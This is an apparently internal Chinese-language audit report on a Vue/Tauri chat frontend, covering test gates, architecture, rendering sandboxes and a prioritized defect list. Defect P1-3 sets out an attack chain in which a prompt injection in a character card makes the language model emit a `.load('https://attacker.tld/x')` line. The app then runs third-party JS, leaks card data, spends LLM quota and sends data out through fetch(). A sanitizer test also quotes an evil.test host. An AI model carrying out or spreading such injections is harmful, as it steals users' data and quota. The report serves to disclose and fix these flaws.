# Kedai 前端调查报告

> 日期：2026-09-26
> 范围：`web/`（Vue 3.5 + Vite 6 + Tailwind v4 + Pinia 2）——281 个源文件、约 5.8 万行 `.ts`/`.vue`
> 方法：静态代码勘察 + 4 路并行专项审查（数据层 / 组件与渲染 / 测试与门禁 / 质量与风险）+ **本机实跑全部门禁命令**
> 边界：本报告不含真实浏览器或桌面壳的人工交互验收；涉及"用户能否感知"的判断均给出代码依据，个别行为无法离线判定的列入「附录 B 待验证清单」。

---

## 一、结论摘要

**这是一个工程化程度显著高于同类个人项目的 Vue 应用。** 它的测试是真的（行为/契约断言为主，未发现伪测试）、门禁是硬的（类型逃逸 ratchet、跨端契约校验、体积预算都有机器执行）、安全边界是有文档的（三条 iframe 通道各自的信任模型与服务端 CSP 分档写在源码注释里）。同时它背着一副明确的存量包袱：一个 1240 行的上帝组件、一个 134KB 的单体 CSS、以及"最硬的门禁跑在最少的路径上"的治理错位。

五条核心判断：

1. **门禁体系真实有效**，本机实跑全绿（下节证据）；但**体积预算余量只剩 4.5%**（首屏 gzip 275,170 / 288,000），且这条最硬的前端门禁在 `pre-push`（`-Quick`）路径上**根本不执行**，CI 又自述未接远端——等于当前处于"预算贴着红线、却无人自动看"的状态。
2. **测试规模与真实性都过关**（113 文件 / 运行时 1210 用例全绿，16.96s），但**没有覆盖率度量**（依赖、配置、脚本三层皆无）。11 个零测试文件约 2,700 行，其中 `cssSanitize.ts` 是安全关键代码，`sandbox/iframe-lifecycle.ts`（497 行）与 `composables/useResourceFrames.ts`（384 行）是运行期子系统——这些代码删掉后测试仍然全绿。
3. **三个 P1 级缺陷**（均经本人读码复核）：异步竞态的旧响应覆盖新选择（4 处同构）、`ChatInput` 图片预览的 blob URL 从不回收、**远程资源卡的触发门槛过低**——一条消息文本即可让宿主代拉第三方页面并执行其 JS，绕过 `renderHtml` 开关与逐卡哈希授权两道闸门。
4. **安全基线整体扎实**：三条 iframe 通道全部 opaque origin（无 `allow-same-origin`）、零网络出口、服务端 CSP 按信任级分档；`mini-jquery`/`dom-rpc` 把作者脚本的 DOM 操作关在白名单里；实测 `cssSanitize` 拦住了 `url(javascript:)`、`expression()`、`behavior:`、`@import`。
5. **最大结构性债务是"导航三缺"**：没有路由（`package.json` 无 `vue-router`，全仓零命中）、没有弹窗栈（16 个弹窗共享 `uiPrefs` 里的扁平布尔开关）、没有焦点管理（全仓 `role="dialog"`/`aria-modal`/焦点陷阱零命中，ESC 仅在输入框联想菜单里有一处）。键盘用户无法关闭任何弹窗，其中包含退出确认框。

---

## 二、实测证据（本次真跑过的命令）

以下全部为本机实际执行、`exit=0` 的结果。

| 命令 | 实测结果 | 判定 |
|---|---|---|
| `npm test -w web` | **113 files / 1210 tests passed**，耗时 16.96s | ✅ 全绿 |
| `npm run typecheck -w web` | `vue-tsc --noEmit` 无输出 | ✅ 0 error |
| `npm run lint -w web` | `49 problems (0 errors, 49 warnings)` | ✅ 硬门禁口径是 0 error |
| `npm run build -w web` | `built in 5.34s`，55 个 chunk | ✅ |
| `node tools/check-bundle.mjs` | 首屏 gzip **275170 / 288000**（余 12830）；全部资产 **478065 / 506000**（余 27935）；`[OK] 首屏无弹窗 chunk 预载` | ✅ 通过，但**已用 95.5%** |
| `node tools/check-frontend-lint.mjs --verbose` | `any:0 / asNever:31 / asUnknownAs:69 / @ts-expect-error:6 / 非空断言:33`，五项**恰好等于基线** | ✅ 未超基线 |
| `node tools/check-arch.mjs` | 前端 A/B/I/J 无违规；`store 循环依赖:0`；`组件直改 state:49 处(白名单 49)`；5 条已登记债务 | ✅ |
| `node tools/count-tests.mjs --check` | 前端 113 文件 / 1192 静态用例，与 `MAINTENANCE.md`、`README.md` 一致 | ✅ 快照未漂移 |

**两处值得单独说明的实测细节**：

- **静态计数 1192 与运行时 1210 的 18 个差值是真的**，根因是 `web/src/mvu/parser.contract.test.ts:67-73` 用 `for (const c of fixture.cases) it(c.name, ...)` 循环生成用例——静态计数只数到那一个 `it(`。文档已记录该差值并给出根因，两者不矛盾。
- **`check-frontend-lint.mjs` 的五项指标全部"恰好等于基线"**，没有一个有余量。这是 ratchet 的正常形态（只降不升），但也意味着**下一次为构造 fixture 写 `as never` 就会直接红**——`Sidebar.test.ts:65` 这类测试写法正在消耗公共余量。

---

## 三、架构地图

### 3.1 规模与分层

| 目录 | 文件数 | 行数 | 角色 |
|---|---|---|---|
| `components/` | 94 | 21,031 | 视图层（54 个 `.vue` + 配套逻辑/测试） |
| `api/` | 46 | 5,640 | HTTP/SSE 封装 + 线格式类型 |
| `stores/` | 16 | 4,950 | Pinia 状态层 |
| `composables/` | 23 | 4,529 | view-model 与副作用接线 |
| `sandbox/` | 13 | 3,884 | iframe 沙箱协议与生命周期 |
| `utils/` | 18 | 2,884 | 纯函数（流程图、徽标、布局） |
| `mvu/` | 13 | 1,903 | MagVarUpdate 兼容层（变量树协议） |
| `contracts/` | 2 | 203 | 契约 diff |
| 根文件 | ~50 | ~17,000 | 渲染管线、脚本执行、平台判定等 |

分层不是口头约定，是**机器门禁**：`tools/arch-layers.json` 把前端目录分成 L1（`api`/`contracts`/`mvu`/`utils`）、L2（`stores`/`composables`）、L3（`components`/`sandbox`），禁止 `L2→L3` 与 `L1→L2/L3`；32 个根文件必须逐个登记（`check-arch.mjs` 规则 I），跨代边必须登记（规则 J）。当前有 2 条已登记的前端越代债务（`composables→components`、`stores→characterScriptSandbox`）。

### 3.2 视图模型：没有路由，用"store 布尔 + 注册表"替代

`package.json` 无 `vue-router`，全仓 `useRouter`/`RouterView`/`createRouter` 零命中。页面级切换由两条正交机制承担，都在 `App.vue`：

- **视图级**（`App.vue:328-331`）：`<Transition mode="out-in">` + `<ChatWindow v-if="store.appMode === 'roleplay'" /> / <TaskBoard v-else />`。**只有两个页面**，且切换时旧视图**真卸载**。
- **弹层级**（`App.vue:411-413`）：`MODALS` 注册表 `v-for` 派生，`v-if="isModalOpen(modal.flag)"` 读 store 布尔。
- **深链接补偿**：`App.vue:225-280` 用 `location.hash === '#settings'` + `hashchange` 手写伪路由，`inTauri` 时整段跳过。
- **Android 返回键**（`App.vue:118-143`）：手写 `handleAndroidBack()`，逆序遍历 `MODAL_FLAGS` 实现"返回=关最上层弹窗"——这是全仓唯一有栈语义的地方。

**代价**：无 URL 语义、无浏览器前进/后退、不可深链接到具体会话或任务，用户无法分享/收藏"某个会话"。**收益**：极简启动路径，与 Tauri/Android WebView 的确定性行为（`App.vue:99-107` 记录了 about:blank 白屏事故的教训）。

### 3.3 弹窗系统：16 个注册项、无栈、无 ESC、无焦点

`modals.ts:40-58` 声明 **16 条** `modal(flag, label, () => import(...))`，声明顺序即渲染顺序（后声明者 DOM 更靠后、叠在上层），`exitConfirmOpen` 特意放到最后压在全部之上。

这套系统有一处**确实做得好的设计**：`modals.test.ts` 是元测试，三边拉齐——① 注册表 flag 无重复、条目必须是 `defineAsyncComponent` 产物；② 解析 `uiPrefs.ts` **源码文本**抽 `const xOpen = ref(false)` 名字集合，与 `MODAL_FLAGS` 双向相等；③ 断言 `App.vue` 含 `v-for="modal in MODALS"` 且**不得残留** `v-if="store.<flag>"` 硬编码。新增弹窗漏改必红。

缺陷集中在交互完备性：

- **ESC 关闭全仓仅 1 处**，且是 `ChatInput.vue:131` 的 slash 联想菜单，不是弹窗。
- **焦点管理完全缺失**：`role="dialog"`、`aria-modal`、焦点陷阱、`autofocus` 全仓零命中；`.focus()` 只有 3 处（两处在输入框、一处在沙箱 RPC）。
- **17 个弹窗共享 `--z-modal: 50`**，靠 DOM 顺序叠放。
- **`SettingsHub` 用"打开面板后关闭自己"规避两层弹窗**（`SettingsHub.vue:59-62` 注释明说"避免两层弹窗叠着"）——这是没有栈的后果。

### 3.4 数据层：门面 + 8 个领域 store + 4 类数据流形态

**Store 结构**：`store.ts` 是兼容门面（`useAppStore`），setup 期无差别实例化 8 个子 store，用 `storeToRefs` 展开状态、逐条转发 100+ 动作；组件侧有 **52 个 `useAppStore()` 调用点**。依赖图**零环**（`check-arch.mjs` 规则 A 硬守，实测 0 个），跨 store 通信有**两条并行机制**：编译期直接 `import`（4 条边）+ 运行期回调桥 `stores/storeBridge.ts`（6 条边，带安全空实现降级）。

一个副作用值得记录：门面在 setup 期实例化全部子 store，导致"任何弹窗都牵动全量 store"，这直接**封死了后续按弹窗做代码分割的空间**——`vite.config.ts:44-58` 记录了实测事故（归组后 `modal-worldbooks` 从 25.9KB 涨到 191KB），最终只能整段删除应用代码的 `manualChunks` 逻辑。

**数据流存在 4 种形态**，其中两种是架构散点：

| 形态 | 路径 | 规模 |
|---|---|---|
| A（规范） | 组件 → `useAppStore()` → action → `api/*` | 52 个调用点 |
| B（旁路 store） | 组件/composable → `import * as api` 直调 | **65 处 `api.*(`，分布 21 个文件** |
| C（越层） | composable → `api/client.authorizedFetch` 自拼 URL | 2 处（`useResourceFrames.ts:81,268`） |
| D（本地草案双持） | composable 内 `ref` 深拷贝 store 状态 | `usePromptInject.ts:35`、`useAgentFlow.ts:145-334` |

形态 C 最刺眼：`useResourceFrames.ts:82-90` 重造了一份 `api/stream.ts:27-43` 已有的错误分类逻辑——`api/stream.ts:3-8` 的文件头注释正把"4 处 multipart 上传各自手写错误口径"列为**已收口**的历史问题，这里是同一形态的漏网第 5 处。

**双持/双写状态共 7 处**，其中两处风险最高：

- `composables/usePromptInject.ts` 的 draft 与 `genSettings.promptInject` 深拷贝双持，**全文件无脏检查**（对比 `useAgentFlow.ts:306` 有 `draftDirty()`）。任何一次 `loadPromptInject()` 都会静默覆盖 store，而 draft 仍持旧副本；用户随后保存 draft 即把旧配置写回服务端——这是一条可直接复现的数据回退路径。
- `stores/character.ts:166-172` **越过 chat store 的 action 边界直改其 6 个字段**（`currentSessionId`/`sessions`/`messages`/`lastUsage`/`agent`/`mvuVariables`）。会话重置的字段集合没有单一出处，chat store 里任何新增的会话级状态都不会被清空。

**SSE/流式**是三段式中最成熟的一处：`api/stream.ts`（机制）→ `api/sseParser.ts`（帧）→ `api/chat.ts`（语义，三条兜底终态合成）→ `chatStreamService.ts`（生命周期）→ `stores/chat.ts`（状态应用）。`api/chat.ts:109-110` 的设计目标写得很清楚：**必发终态以复位 `generating`，否则 UI 卡在生成中**。任务侧的重连更有行为级测试：指数退避（1→2→4…15s 封顶）+ 1500ms settle + 5s 兜底轮询，`stores/task.test.ts:256-381` 断言的是毫秒序列与轮询启停，不是"函数被调用过"。

### 3.5 渲染管线：四条路径，各自的信任模型不同

聊天消息 HTML 的**唯一出口**是 `ChatMessageItem.vue:246-264`，按固定优先级分四路：

| 路 | 触发条件 | 净化 | iframe sandbox | 服务端 CSP 网络出口 |
|---|---|---|---|---|
| ① 远程资源卡 | 消息文本含 `.load('https://…')` | **无内容净化**（仅 URL 白名单 `https:`+无凭据，`render.ts:545-553`） | `allow-scripts allow-popups allow-forms allow-modals` | **完全开放**（`connect-src https: http: blob:`） |
| ② 渲染面板 | 文本是整页 HTML 代码块 | 无净化，原样注入 | `allow-scripts` | 零（`default-src 'none'`） |
| ③ 角色卡脚本 | `renderHtml && scripts.length > 0` | `demoteInlineHandlers` → 43 标签白名单 → CSS 声明级清洗 → 作用域化 | `allow-scripts allow-modals` | 零 |
| ④ Markdown 兜底 | 其余 | `markdown-it html:false` 全转义 | — | — |

`<UpdateVariable>` 协议块在进入任何渲染路径前被剥离（`render.ts:385`、`markdown.ts:14`）——这点做得对。

**① 是整条管线里信任模型最宽的一路**，理由见 §五 P1-3。

`v-html` 共 9 处：`ChatMessageItem.vue:358` 一路 + `TaskBoard.vue` 8 处。**TaskBoard 的 8 处全部只走 `renderMarkdown`（`html:false` 转义），不经过脚本/HTML 分支**——即"任务模式不支持角色卡 HTML 渲染"，这是明确的、值得记录的**功能非对称**，也是一个安全上的好消息。

`eval` / `new Function` 只存在于沙箱文档字符串生成器 `sandbox/boot-script.ts:54,129`，**宿主页面零使用**。服务端 `security.rs:242-270` 的注释解释了为什么沙箱文档可以有 `'unsafe-eval'`：求值对象仅限作者自己的代码，与用户已授权执行的卡脚本同信任级，且沙箱不透明来源 + 零网络出口不变。这条推理成立。

### 3.6 样式系统：134KB 单体 CSS 是"有纪律的存量"，但纪律在漂移

`style.css` = **4,163 行 / 133,610 字节**，`@import "tailwindcss"` 是它唯一的 Tailwind 接触点——全文件 `@theme`/`@utility`/`@layer`/`@apply` 零命中。也就是说：**Tailwind 在这里只被当作布局 shorthand 用**（`flex` 73 次、`items-center` 36 次），视觉语言 100% 靠手写 CSS + 手写 `:root` 令牌。

不拆分是**有文档的决策**而非疏漏：`style.css:22-35` 明确"本文件只保留层①设计变量与层②基础层，其下各区均为存量层③，遵循**改到谁拆谁**；新增组件样式一律 `<style scoped>` 或 Tailwind 工具类；`!important` 存量 11 处，新增不得再引入"。

**但这条纪律没有机器门禁，于是它在漂移**：`!important` 实测 **13 处**（注释说 11 处）。同类的还有 `TaskBoard.vue:1148` 的 `var(--sv-text-dim, #999)`——`--sv-text-dim` 在 `style.css` 里**根本不存在**（`grep -c` = 0），实际永远落到硬编码 `#999`；`TaskBoard.vue:1160` 的 `var(--sv-accent, #4ea1ff)` 更微妙：`--sv-accent` 确实存在但指向 `--sv-pink-deep`（粉色），蓝色回退值掩盖了作者本意。

---

## 四、值得保留的设计

审查中反复遇到"这里为什么不那样写"的疑问，然后发现注释里已经写了理由。以下设计建议原样保留：

1. **`modals.ts` 单点注册表 + `modals.test.ts` 三边元测试**——本报告见到的最好的"元测试"实践：既查运行期对象，也解析源码文本对齐 store 开关，还断言 `App.vue` 不得回退为硬编码。
2. **`tools/check-frontend-lint.mjs` 的类型逃逸 ratchet**——零依赖、只降不升、注释里记录了自身曾因 CRLF 导致计数失准的修复过程（`:74-80`）。生产代码实测 `any` **0 处**（唯一一处出现在注释里）、`@ts-ignore` **0 处**。
3. **`tools/check-contract.mjs` 的跨端字段差集**——把 `api/types.ts` 手写类型与 Rust 结构体做集合比对，两条判定方向都对（后端有前端缺 = FAIL；前端有后端无 = FAIL）。它的存在理由被写成历史事故注释："`DistillResult.skipped` 后端已下发、前端漏字段，消费方读到 undefined"。
4. **`tools/check-bundle.mjs` 的体积预算**——按 gzip 判定、四类检查、fail-closed（`dist` 缺失即 FAIL）、`FORBIDDEN_PRELOAD_PREFIXES = ['modal-']` 是 P-8 事故的固化护栏（`check-bundle.mjs:14-16` 记录了修复前首屏白拉 188,635 B 的实测值）。ratchet 纪律也写得清楚："先量实测值确认增长有正当理由，再上调到实测值 +10%；禁止直接删除检查项"。它甚至**记下了自己的治理失败案例**（`:55-59`：某批验收漏跑体积门禁导致超限未被发现，"只跑部分门禁不等于门禁绿"）。
5. **三条 iframe 通道的服务端 CSP 分档**（`security.rs:242-343`）——按信任级递减给不同网络出口，且每档都写了"为什么这档可以放行"。
6. **`sandbox/shared-globals.ts` 的跨 realm 共享桥**——键黑名单（挡 `window`/`document`/`fetch`/`eval`…）+ JSON 子集 + 单值 ≤256KB + 深拷贝隔离。
7. **`mvu/variables.ts:17-23` 的原型污染防护**——`pathGet/pathSet/pathDelete` 一律拒绝含 `__proto__`/`constructor`/`prototype` 的点路径段（因为 LLM 输出不可信）。这是很到位的细节。
8. **`render.ts:` 的样式作用域化 + keyframes 重命名 + stableFrameNonce**——后者用 FNV-1a 按 `url+seed` 稳定派生 nonce，解决"随机 nonce → v-html 变 → iframe 重建 → 1.25MB 资源页反复重下载"，注释里诚实标注"非安全随机：认证强度依赖父页面隔离，而非不可猜测性"。
9. **`platform.ts`**——23 行叶子模块，三态判定（浏览器/桌面 Tauri/Android Tauri）+ 4 个消费点 + 技术债注释（为什么用 UA 嗅探而非 `plugin-os`：本机拉不到新依赖）。
10. **Vue Flow 的依赖边界控制**——逻辑层零 import 画布库（`useFlowCanvas.ts:3-4` 明说"不 import `@vue-flow/*`，于是能在 node 环境直接单测"）、异步 chunk、只覆盖 CSS 变量不用 `:deep` 穿透。
11. **`ChatInput.vue:144` 的 `!e.isComposing`**——中文输入法组字期间 Enter 不误发送。中文应用的关键细节。
12. **`useFlowConnections.ts:3-5` 的"显式拒绝复用"决策记录**——用 40 行的独立 composable 而不是复用 `useConnectionProfiles`，理由写在注释里。这种记录比"看起来重复所以合并"更值钱。
13. **全仓 `TODO`/`FIXME`/`HACK` = 0、注释掉的代码 = 0**——债务走显式登记（`check-arch.mjs` 的 5 条债务输出 + `KNOWN_CYCLES` + ratchet 基线），不靠注释蠕变。

---

## 五、缺陷清单

### P1 — 建议优先修

#### P1-1 `await` 之后缺"请求键仍是当前键"守卫（4 处同构）

| 位置 | 问题 | 后果 |
|---|---|---|
| `stores/chat.ts:101-102` | `loadHistory` 拿到响应后**不校验** `currentSessionId` 是否仍等于 `sessionId`，直接 `messages.value = msgs` | 切会话 A→B 时 A 的响应后到 → 显示 A 的消息而 `currentSessionId` 是 B；随后发送会污染 B，`resendMessage` 会按 A 的锚点 `truncateMessages` **误删 B 的历史** |
| `stores/character.ts:198-206` | `selectCharacter` 尾段三个 `await`（`loadSessions`/`loadHistory`/`newSession`）之后无 `currentCharacterId.value !== id` 检查 | 快速切角色 A→B，A 的会话列表与 sessionId 覆盖 B；"上次打开的会话"记忆被写错 |

**这处尤其能说明问题**：同一个函数里，`fetchCharacterDetail().then` 分支（`:157-158`）和脚本哈希分支（`:162`）**都有**守卫，`chat.ts` 里 `restoreAgentTrace`（`:127`）**也有**守卫并写了注释"迟到的响应不得覆盖当前会话（loadHistory 并发可重入）"——**偏偏 `loadHistory` 自己没有**。

| 位置 | 问题 |
|---|---|
| `stores/task.ts:415` | 守卫写反了方向：`if (sig !== detailSignature \|\| currentTask.value?.task.id !== id)`。注释（`:414`）的自述意图是"切任务后旧签名残留时也要替换"，但缺的正是 `id === currentTaskId.value` 这一半——A 的响应迟到时，`currentTask?.task.id` 是 `'B' !== 'A'` → 条件恒真 → **强制覆盖为 A** |
| `stores/task.ts:433-444` | `loadTaskCalls` 只有内容签名去重，无 taskId 时效校验，`taskCalls.value = calls` 可被迟到响应覆盖（签名不能替代 id 守卫：A/B 内容不同时签名必然通过） |

**统一修法**：在 `await` 之后、赋值之前插入一次键比对——`if (currentSessionId.value !== sessionId) return;`；或引入自增 `requestSeq`，响应回来时丢弃过期序号（对"同 key 连续两次请求"也安全）。

#### P1-2 `ChatInput` 图片预览的 blob URL 从不回收，且每次渲染新建

`ChatInput.vue:72-77` 的 `getFilePreview()` 每次调用都 `URL.createObjectURL(file)`；`:238` 的模板 **同一次渲染里调用它两次**：

```html
<img v-if="getFilePreview(f)" :src="getFilePreview(f)!" alt="" />
```

`text` 是模板的直接依赖（`disabled` 绑定），因此**每次击键都重渲染整个组件** → 每个附件每击键新建 **2 个** blob URL。全仓 `revokeObjectURL` 只有 `exportFile.ts:32` 一处，与此无关。

**后果**：附加一张图后输入 200 字 ≈ 400 个存活 URL，每个 pin 住原始 `File` 字节（单文件上限 10MB，`ChatInput.vue:56`），且 `:src` 每帧变化会让浏览器反复重新解码图片（可见闪烁 + CPU）。桌面端内存持续上涨；Android 端 `ChatInput` 是主输入区，存在被系统 OOM 杀进程的风险。

**修法**：按 `File` 生成一次 URL 存进 `Map`，`removeAttachment` 与 `onBeforeUnmount` 时 `revokeObjectURL`，模板改为读缓存值。

#### P1-3 远程资源卡：一条消息文本即可装载并执行第三方 JS，绕过两道授权闸门

**链路**（三处代码均在本人读码中复核）：

1. `render.ts:538` 的正则 `/\.load\s*\(\s*['"]([^'"]+)['"]\s*\)/i` 只匹配**消息文本**里出现 `.load('https://…')`，`isSafeResourceUrl` 只校验 `https:` + 无凭据。
2. `ChatMessageItem.vue:247-250` 把它放在**分支优先级第一位**——**在** `props.renderHtml` 开关（`:254`）与脚本授权门禁**之前**。
3. `useResourceFrames.ts:311-353` 的 `hydrate()` 扫描 DOM 里的 `iframe[data-kd-resource-frame="1"]`，注册条目、**经后端代理预拉取该 URL 的 HTML**。该函数内**无任何授权或开关检查**（`grep authoriz|renderHtml` 零命中）。
4. 拉到的 HTML 由宿主文档 `appendChild` 重建以触发脚本执行，iframe 属性为 `sandbox="allow-scripts allow-popups allow-forms allow-modals"`（`render.ts:612`，无 `allow-same-origin`）。
5. `useResourceFrames.ts:216-245` 的 `handleTavernCall` 处理 `method === 'generate'`，把作者页给的 `user_input` + `injects` 组装后**由宿主带 token 转发 `/api/chat/generate-raw`**（`:268`）。

**可利用性：是。** 攻击链：恶意卡的世界书/提示词注入 → 模型输出一行 `$('body').load('https://attacker.tld/x')` → 前端自动装载该页 → 页面在 opaque-origin iframe 内执行 JS，拿到 boot 下发的 `charData`、世界书条目、并经 `TavernHelper.generate` 驱动用户的 LLM 额度，最后 `fetch()` 外发（该通道 CSP 放行 `connect-src https: http: blob:`）。

**影响边界**：拿不到聊天历史、cookie、token（无 `allow-same-origin`），属"执行第三方代码 + 泄漏卡元数据/世界书/LLM 产出 + 消耗额度"，不是全量数据外泄。**但产品对第三方 JS 设的两道闸门（`renderHtml` 开关 + 逐卡 SHA-256 授权）被绕过了**——同一份作者 JS 走卡脚本通道需要用户显式授权，走资源卡通道只需要一条消息文本。

**修法（择一）**：资源卡首载加"点击加载"确认；或要求 `renderHtml && currentScriptAuthorized` 才 `hydrate`；至少把 `TavernHelper.generate` 桥纳入逐卡授权。

#### P1-4 `resourceStore` 快照加载的双快照分裂与丢失更新

`resourceStore.ts:218-244` 的 `loadResourceSnapshot` 在 `await idbGet(url)` **之前**就 `loaded.add(url)`，而在 `await` **之后**才 `memory.set(url, snap)`（`:242`）。这个窗口内 `memory.get(url)` 返回 `undefined`，于是并发触发的 `applyResourceSync`（`:247-254`）会新建第二份空快照并写入 `memory`，再调 `loadResourceSnapshot` —— 因为 `loaded` 已置位，第二次调用**立即返回新快照、不读 IndexedDB**。随后第一次调用恢复执行，把 IDB 内容 merge 进**旧快照**，并用 `memory.set` 把旧快照写回 `memory`，**覆盖掉刚刚同步进来的数据**。

**后果**：资源包"下载→丢→重下"，对一个 96MB 的真实资源卡（`resourceStore.ts:57` 单条上限 192MB）意味着重复的网络与磁盘开销。

### P2 — 建议排期

| 位置 | 问题 | 后果 |
|---|---|---|
| `renderCache.ts:115-116` + `ChatMessageItem.vue:220-241` | 缓存 key 末尾是**整段文本**，不区分是否流式 | 流式期间每帧 `set` 一个新条目：一条 8 秒回复（约 480 帧）就把 500 容量的缓存**全部替换为该消息的历史前缀**，把稳定历史条目挤光 → P-9 优化（注释自陈省掉 3.057ms/16.8k 字符）在生成时段完全失效 |
| `cssSanitize.ts:148-153` | `scopeSelector` 对以组合器开头的选择器只做前缀拼接 | `~ .sv-msg` / `+ div` / `> .sv-inputbar` 都可**越出作用域容器**，配合白名单放行的 `position:fixed`/`z-index` 可做界面遮挡与点击劫持（例：盖住"停止生成"按钮） |
| `sandbox/sanitize.ts:15-16` | `'*'` 白名单含 `style`，**但该文件没有 `transformTags`**（`grep` 零命中） | 运行期注入通道的 `style=""` 属性**不做声明级清洗**，而静态通道 `render.ts:206-211` **做**（`sanitizeStyleAttribute`）。同一份作者 CSS，写在 `<style>` 里被清洗、写在 `style=""` 里不清洗——两通道口径不一致 |
| `chatStreamService.ts:30-31` | 终态集合漏 `error`（只有 `finish \| interrupted`） | `error` 终态后 `activeController` 永不释放，`isActive()` 恒为 `true`。当前**不可观测**（`isActive()` 是死代码，唯一调用点是它自己的测试），但一旦有人用它判断"是否正在生成"就会表现为按钮状态卡死。同类终态集合在 `api/chat.ts:77` 与 `sseReducer.ts:188/213/254` 各写一份，已产生这一处不一致 |
| `stores/genSettings.ts:141-196` vs `:206-259` | `loadSettings`/`saveSettings` 的字段回填块**51 行逐字重复**（diff 仅 3 类差异） | 新增任一后端设置字段都要在两处各写一遍 `?? 默认值`，漏一处即"保存后立刻回退"。这 51×2 行同时是**第三份默认值契约**（既不在 Rust 也不在 TS 类型里） |
| `stores/character.ts:49` | `characterDetails` 是普通 `Map` 缓存（非响应式），`deleteCharacter`（`:224-233`）**不清理它** | 删卡后重新拉同 id 会命中陈旧详情 |
| `api/shape.ts` vs 其余 22 个资源模块 | 形状闸门（"把 200+`{error}` 或字段改名变成可捕获 Error"）只覆盖 7/29 个模块 | 22 个模块里后端改字段名会在下游以随机 TypeError 崩溃，报错点远离真正原因（`api/tasks.ts:89-93` 的注释举的正是这个场景） |
| `stores/chat.ts:187` vs `sseReducer.ts:258` | `contextTokens` 有两个权威：本地消息重算 与 上游 usage 上报，无协调、后写覆盖 | 同一次生成的首尾值跳变，消费方无法判断哪个权威 |
| `sandbox/protocol.ts:132-138` | `utf8Bytes` 为量长度做 `JSON.stringify` + `TextEncoder.encode`（两份全量副本），且在**每条**非 ready 沙箱消息上都跑 | 脚本密集的卡片（wuwa 状态栏批量 DOM 操作）每条 batch 付两遍全量序列化 |
| `scriptRunner.ts:78` | `cleanups: Map<HTMLElement, SandboxCleanup[]>` 用 DOM 元素做**强引用键**，只在组件卸载时清 | 消息被删除/虚拟滚动卸载后其容器与注入节点无法回收，直到 ChatWindow 卸载（建议 `WeakMap` 或 `!isConnected` 惰性清理） |
| `components/RenderPanelHost.vue:48-58` | 每个渲染面板注册 `window.addEventListener('message', onSize)`，**`onSize` 全程无 `removeEventListener`**，也无 `onBeforeUnmount`；`:77` 的 12s 兜底 `setTimeout` 同样不取消 | 面板随虚拟滚动卸载/重挂会线性累积监听器与闭包 |
| `stores/task.ts:349-357` | `contentSignature` 对每个事件 `JSON.stringify(detail)`（含全部 subtasks、plan result、messages） | multi/team 模式事件密集时，每个事件一次 MB 级序列化 |
| `composables/useVirtualMessages.ts:86-94` | `isWithinRowWindow` 每次调用遍历整个 `visible` 集合，而模板**每行调一次** `vm.isActive` | 2000 条消息 + `visible` 涨到 100 时，一次渲染约 20 万次 `Map.get`（**待量化**：见附录 B-2） |
| `api/client.ts:136-139` | 对 204/空体返回 `undefined as T`；JSON 解析失败**不包装** | `JSON.parse` 的 `SyntaxError: Unexpected token '<'` 会经 `catch (e) { alert(e.message) }` 直达用户（英文、解析器内部信息） |

### P3 — 顺手改

- `stores/character.ts` 与 `ChatTopbar.vue:31-32` 的不同策略：`renderHintDismissed`/`jsHintDismissed` 是**组件内** `ref<Set>`、不持久化，而 `App.vue:328-331` 的 `mode="out-in"` 会在模式切换时**真卸载** ChatWindow → 用户每次从任务模式切回都要重新关闭两条引导条。同一 UI 区域里相邻的 `renderHtmlOverrides` 却做了 localStorage 逐卡持久化。
- **同名不同物**：`renderCache.ts:83` 的模块级有界缓存叫 `messageHtmlCache`，`TaskBoard.vue:356` 的组件内 computed 局部变量**也叫这个名字**，两者不共享。建议其中一处改名。
- `stores/storeBridge.ts:9` 的纪律写"新增跨 store 调用**必须**走本桥"，但既存代码有 4 条直接 `import` 边（`chat.ts:21-22`、`genSettings.ts:13-14`）——纪律文本比实际执行更严，评审时无客观依据。
- `stores/chat.ts:309` 的注释说 `regenerateMessage`"复用 resendMessage 管线"，实际是逐行复制（`:345-362` 抄 `:281-299`）。
- `stores/task.ts:224` 的注释说 `clearAllLiveDeltas` 用于"任务终态让位"，实际调用点只有 4 处、终态不清（由 `llm_call` 按 key 清理兜住）。
- `web/src/{stores,api}` 下 18 个文件是 CRLF、另 3 个是 LF，同目录混用。这**曾击穿一道护栏**：`check-frontend-lint.mjs:77-80` 记录了旧实现的 `l.replace(/\/\/.*$/,'')` 在 CRLF 文件上完全不剥离注释，导致 ratchet 计数"取决于文件行尾"。
- 死代码：`utils/agentFlowGraph.ts` 的 `isGeneratingStep`/`wouldCreateFlowCycle`/`flowNestingDepth`/`levelOf`/`outputStep`、`utils/agentFlowLayout.ts` 的 `NODE_W`/`NODE_H`/`GAP_X`/`GAP_Y`/`autoLayout`、`sseReducer.ts:64-80` 的 `swipeIndex`/`swipeCount`（与 `ChatMessageItem.vue:79-88` 的同构重写重复）等，生产端零引用。
- `SettingsHub.vue:61` 用运行期 flag 字符串直写 store（`store[flag] = true`），`App.vue:31` 为此做了 `as unknown as` 放宽。有注释解释与元测试兜底，属可接受但值得记住的类型破口。

---

## 六、测试与门禁评估

### 6.1 测试资产与真实性

**规模**：113 文件 / 静态 1192 用例 / 运行时 1210（全绿）。测试文件 / 源文件 ≈ **0.67**。

**分布**：`components` 28、根目录 24、`api` 17、`utils` 8、`composables` 8、`stores` 7、`sandbox` 6、`mvu` 6、`contracts` 1。

**重测试区**（这四块的测试体量与实现体量同级，本身就是信号）：角色卡脚本沙箱（6+ 文件）、任务模式（6 文件）、二维流程编辑（9 文件）、渲染与消毒（5+ 文件）。

**真实性抽查**（我指定了 5 个跨目录文件，逐一读断言体）：**未发现"纯 mock 回显"型伪测试**。

- `sandbox/sanitize.test.ts` — 含**负向安全断言**：`expect(out).not.toMatch(/expression|@import/i)`、`not.toContain('http://evil.test')`。
- `stores/task.test.ts` — 用 `vi.hoisted` 暴露 `subscribeCalls/listFetchCount` 等**协议级可观测句柄**，断言退避毫秒序列（1→2→4）与"数据未变时保持引用相等"，不是"函数被调用过"。
- `api/tasks.test.ts` — 用真实 `ReadableStream` 模拟**分 chunk 到达**的 SSE 帧，不是字符串替换 mock。
- `utils/agentFlowGraph.test.ts` — 文件头显式声明"只断言数据层（与「画布不做像素断言」同一原则），不涉及 DOM"。
- `components/Sidebar.test.ts` — 最浅的一个，只覆盖空态与 class 开关；且 `:65` 用 `as never` 构造 fixture，消耗公共 ratchet 余量。

唯一需要注意的**方法论边界**：13 个 `api/` 资源测试的请求体与响应体**都是测试自己写的**，因此它们能抓"改了前端请求体忘了改测试"和 URL 拼错，但**原理上无法发现后端与本层不一致**——那只能靠 `check-contract.mjs`，而后者只覆盖 21 组映射。

